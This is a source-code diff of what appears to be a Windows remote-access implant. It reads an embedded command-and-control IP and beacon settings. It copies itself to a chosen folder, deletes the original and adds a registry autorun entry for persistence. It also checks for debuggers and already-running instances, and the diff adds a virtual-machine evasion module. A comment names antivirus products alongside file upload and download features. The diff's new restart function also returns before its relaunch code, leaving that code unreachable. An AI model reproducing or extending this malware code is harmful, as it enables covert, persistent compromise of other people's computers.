@@ -25,6 +25,7 @@
 #include "main.h"
 
 #include "config.h"
+#include "vm.h"
 #include <shlobj_core.h>
 
 #pragma comment(lib,"ws2_32.lib")
@@ -62,7 +63,32 @@ int __stdcall delFileProc(wchar_t * filename) {
 }
 
 
+
+int restart(const char * newpath,const char * oldpath) {
+	int ret = 0;
+
+	if (lstrcmpiA(newpath, oldpath) != 0) {
+
+		ret = copySelf((char*)newpath,oldpath);
+		if (ret)
+		{
+			return 0;
+
+			ReleaseMutex(g_mutex_handle);
+			CloseHandle(g_mutex_handle);
+			char szcmd[1024];
+			wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", newpath, oldpath);
+			ret = WinExec(szcmd, SW_SHOW);
+			ExitProcess(0);
+		}
+	}
+	return 0;
+}
+
+
 int init() {
+
+	int ret = 0;
 
 	//__debugbreak();
 
@@ -70,72 +96,52 @@ int init() {
 
 	int argc = 0;
 	LPWSTR * wstrcmds = CommandLineToArgvW(argvs, &argc);
-	if (argc > 2 && lstrcmpiW(wstrcmds[1], L"/Delete") == 0) {
-
-		HANDLE ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)delFileProc, wstrcmds[2], 0, 0);
-		if (ht)
-		{
-			CloseHandle(ht);
-		}
+	if (argc > 2 && lstrcmpiW(wstrcmds[1], L"/Delete") == 0) 
+	{
+// 		HANDLE ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)delFileProc, wstrcmds[2], 0, 0);
+// 		if (ht)
+// 		{
+// 			CloseHandle(ht);
+// 		}
 	}
-
-	int ret = 0;
+	
 	g_mutex_handle = bRunning(&ret);
 	if (ret)
 	{
 		//runLog("already running\r\n");
 		ExitProcess(0);
 	}
+
 	ret = isDebugged();
 	if (ret)
 	{
 		//runLog("debuggered\r\n");
-		ExitProcess(0);
+		//ExitProcess(0);
 	}
 
 	WSAData wsa;
 	ret = WSAStartup(0x0202, &wsa);
 
-#ifdef _DEBUG
+	char curpath[1024];
+	GetModuleFileNameA(0, curpath, sizeof(curpath));
+
 	if (g_predata[16])
-#endif
 	{
 		PROGRAM_PARAMS* params = (PROGRAM_PARAMS*)(g_predata + 16);
 		g_ip = params->ip;
-		//g_ip = inet_addr("192.168.231.1");
-		//lstrcpyA(params->path, "appdata");
-		//g_interval = 1000;
-
 		g_httpsToggle = params->bHttps;
 		g_interval = params->hbi*1000;
 		g_fsize_limit = params->fzLimit*1024*1024;
 
-		runLog("ip:%u,https:%u,interval:%u,filesize:%u,path:%s\r\n", g_ip, g_httpsToggle, g_interval, g_fsize_limit, params->path);
-
-		char curpath[1024];
-		GetModuleFileNameA(0, curpath, sizeof(curpath));
+		opLog("ip:%u,https:%u,interval:%u,filesize:%u,path:%s\r\n", g_ip, g_httpsToggle, g_interval, g_fsize_limit, params->path);
+	
 		if ( isalpha (params->path[0]) &&params->path[1] == ':' && params->path[2] == '\\')
 		{
-			if (lstrcmpiA(params->path, curpath) != 0)
-			{
-				ret = copySelf(params->path);
-				if (ret)
-				{
-					ReleaseMutex(g_mutex_handle);
-					CloseHandle(g_mutex_handle);
-
-					char szcmd[1024];
-					wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", params->path,curpath);
-					ret = WinExec(szcmd, SW_SHOW);
-
-					ret = setRegBootRun(HKEY_CURRENT_USER, params->path);
-					ExitProcess(0);
-				}
-			}
+			ret = restart(params->path, curpath);	
+			//KillSelfAndRun(params->path, "exit");
+			ret = setRegBootRun(HKEY_CURRENT_USER, (char*)params->path);
 		}
 		else {
-			//char* user = getenv("USER");
-			//char* appdata = getenv("APPDATA");
 			char tmppath[MAX_PATH];
 			char* mypath = getenv(params->path);
 			if (mypath == 0)
@@ -154,41 +160,26 @@ int init() {
 			string folder = string(mypath) + "\\" + service_path;
 			char exe_surfix[] = { '.','e','x','e' ,0};
 			string newfn = folder +"\\" + service_path + exe_surfix;
-			if (lstrcmpiA(newfn.c_str(), curpath) != 0)
-			{
-				runLog("folder:%s,path:%s\r\n",folder.c_str(),newfn.c_str());
 
-				CreateDirectoryA(folder.c_str(), 0);
+			opLog("folder:%s,path:%s\r\n", folder.c_str(), newfn.c_str());
 
-				ret = copySelf((char*)newfn.c_str());
-				if (ret)
-				{
-					ReleaseMutex(g_mutex_handle);
-					CloseHandle(g_mutex_handle);
+			ret = CreateDirectoryA(folder.c_str(), 0);
 
-					char szcmd[1024];
-					wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", newfn.c_str(), curpath);
-					ret = WinExec(szcmd, SW_SHOW);
+			ret = restart(newfn.c_str(), curpath);
 
-					runLog("cmd:%s\r\n", szcmd);
+			//KillSelfAndRun(newfn.c_str(), "exit");
 
-					ret = setRegBootRun(HKEY_CURRENT_USER,(char*) newfn.c_str());
-
-					ExitProcess(0);
-				}
-			}
+			ret = setRegBootRun(HKEY_CURRENT_USER, (char*)newfn.c_str());
 		}
+	}
+	else {
+		//MessageBoxA(0, 0, 0, 0);
+		ret = Config::getConfig();
 
 		ret = setRegBootRun(HKEY_CURRENT_USER, curpath);
 	}
-#ifdef _DEBUG
-	else {
-		ret = Config::getConfig();
-		char szpath[1024];
-		GetModuleFileNameA(0, szpath, sizeof(szpath));
-		ret = setRegBootRun(HKEY_CURRENT_USER, szpath);
-	}
-#endif
+
+	
 
 	ret = getUUID();
 
@@ -433,15 +424,30 @@ int __stdcall cmdMission() {
 //macfee,360ºË¾§,¿¨°ÍË¹»ù,MS,huorong
 //file tree,upload port and download port,network optimize
 //all english output,remove anotation
+//disk or file failed
+//
 
 
 int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) 
 {
 	int ret = 0;
 
-	//ret = PathIsDirectoryA("c:\\");
+// 	char cpuid[MAX_PATH];
+// 	cpuBrand(cpuid);
+
+	//ret = getModules();
+
+	//ret = VM::delay(VM_EVASION_DELAY);
+
+	//ret = VM::isVM();
+
+	//ret = VM::getVmTick();
+
+	//KillSelfAndRun("c:\\1.exe", "exit");
 
 	ret = init();
+
+	//ret = Config::getConfig();
 
 	//ret = mainProc();
 
